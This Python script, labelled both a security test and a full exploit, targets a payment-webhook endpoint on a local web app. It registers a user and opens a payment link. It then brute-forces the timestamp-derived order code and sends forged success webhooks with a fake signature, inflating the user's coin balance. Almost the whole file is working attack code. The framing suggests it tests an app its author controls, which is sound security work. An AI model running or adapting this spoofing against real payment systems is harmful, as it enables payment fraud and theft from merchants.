import requests
import time
import random
import string
import sys

# ==========================================
# CONFIGURATION
# ==========================================
# Adjust BASE_URL if your server runs on a different port or host
BASE_URL = "http://localhost:5000/api/v1"
WEBHOOK_URL = f"{BASE_URL}/payos-webhook"

# ==========================================
# THE REQUEST GENERATOR (As requested)
# ==========================================
def generate_and_send_webhook(order_code, amount=50000):
    """
    Generates and sends the POST request to the webhook endpoint.
    This is the core request logic to security test the payment success.
    """
    payload = {
        "code": "00",
        "success": True,
        "data": {
            "orderCode": order_code,  # The critical value to match pendingRequests
            "amount": amount,
            "description": "Security Test Payment",
            "returnUrl": "http://localhost:3000/",
            "cancelUrl": "http://localhost:3000/",
            "transactionDateTime": "2023-10-10 10:10:10"
        },
        "signature": "fake_signature_bypass_verification" # Demonstrating lack of signature check
    }
    
    # Headers - mimicking a standard JSON content type
    headers = {
        "Content-Type": "application/json"
    }

    try:
        # TIMEOUT set low because we might send many of these
        response = requests.post(WEBHOOK_URL, json=payload, headers=headers, timeout=2)
        return response
    except requests.exceptions.RequestException as e:
        # Silently fail or minimal log for brute force speed
        # print(f"Request failed: {e}")
        return None

# ==========================================
# FULL EXPLOIT / SECURITY TEST SCRIPT
# ==========================================
def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def run_security_test():
    print("================================================================")
    print("[*] Starting Security Test for Payment Webhook")
    print("[*] Goal: Validate successful payment processing via webhook spoofing")
    print("================================================================")
    
    # Check if requests is installed
    try:
        import requests
    except ImportError:
        print("[-] Error: 'requests' library is missing.")
        print("    Please install it: pip install requests")
        sys.exit(1)

    s = requests.Session()
    
    # 1. SETUP: Register a User (to have valid userId)
    # We need a user to verify the coin balance increase
    username = f"test123"
    email = f"{username}@example.com"
    password = "password123"
    
    print(f"[*] Step 1: Registering temporary user: {email}")
    try:
        reg_res = s.post(f"{BASE_URL}/auth/register", json={
            "username": username,
            "email": email,
            "password": password
        })
        if reg_res.status_code != 201:
            # Try login if user exists (unlikely given random name)
            print(f"[-] Registration failed: {reg_res.text}")
            return
            
        user_data = reg_res.json().get('user', {})
        user_id = user_data.get('_id')
        print(f"[+] User registered with ID: {user_id}")
    except Exception as e:
        print(f"[-] Setup failed: {e}")
        return

    # Get initial balance
    try:
        me_res = s.get(f"{BASE_URL}/auth/me")
        initial_coin = me_res.json().get('coin', 0)
        print(f"[*] Initial Coin Balance: {initial_coin}")
    except:
        print("[-] Could not get initial balance")
        return

    # 2. TRIGGER: Create Payment Link
    # This places the orderCode into the server's memory map
    test_amount = 50000
    print(f"[*] Step 2: Creating Payment Link (Amount: {test_amount})")
    
    # We capture time to predict the orderCode
    # orderCode = Number(String(Date.now()).slice(-6))
    
    t_start = int(time.time() * 1000)
    try:
        pay_res = s.post(f"{BASE_URL}/create-payment-link", json={
            "userId": user_id,
            "amount": test_amount
        })
        if pay_res.status_code != 200:
            print(f"[-] Create payment failed: {pay_res.text}")
            return
            
        # We assume request processed almost immediately
        t_end = int(time.time() * 1000)
        print("[+] Payment Link Created successfully. Server is expecting a webhook now.")
    except Exception as e:
        print(f"[-] Create payment request failed: {e}")
        return

    # 3. EXPLOIT: Spoof Webhook
    # We don't know the exact orderCode, but it is derived from the timestamp.
    # We brute-force the likely range.
    
    seed = t_start % 1000000
    # Range: -100ms to +2000ms relative to start
    # Assuming server time is reasonably synced or within a few seconds difference.
    
    search_range = range(-500, 2500) 
    print(f"[*] Step 3: Brute-forcing Webhook for OrderCode (based on timestamp: {t_start})")
    print(f"    Scanning {len(search_range)} potential codes...")
    
    success_found = False
    
    for offset in search_range:
        guess_code = (seed + offset) % 1000000
        
        # Send the "JUST request"
        # We ignore return value because server returns 200 OK for everything
        generate_and_send_webhook(guess_code, test_amount * 10) # Amount in webhook might need to match or be ignored
        
        # Check success periodically (every 200 requests to save time)
        if offset % 200 == 0:
            print(f"    > Checked up to offset {offset}...")
            me_res = s.get(f"{BASE_URL}/auth/me")
            if me_res.json().get('coin', 0) > initial_coin:
                success_found = True
                print(f"[!] SUCCESS! Balance updated.")
                break
    
    # Final check
    if not success_found:
        me_res = s.get(f"{BASE_URL}/auth/me")
        final_coin = me_res.json().get('coin', 0)
        if final_coin > initial_coin:
            success_found = True
            print(f"[!] SUCCESS! Balance updated.")
    
    if success_found:
        final_res = s.get(f"{BASE_URL}/auth/me")
        print(f"[+] Final Coin Balance: {final_res.json().get('coin')}")
        print("[+] Security Test PASSED: Payment was successfully spoofed.")
    else:
        print("[-] Security Test FAILED: Could not spoof payment.")
        print("    Possible reasons: Server time desync > 2s, or server restarted, or patch applied.")

if __name__ == "__main__":
    run_security_test()
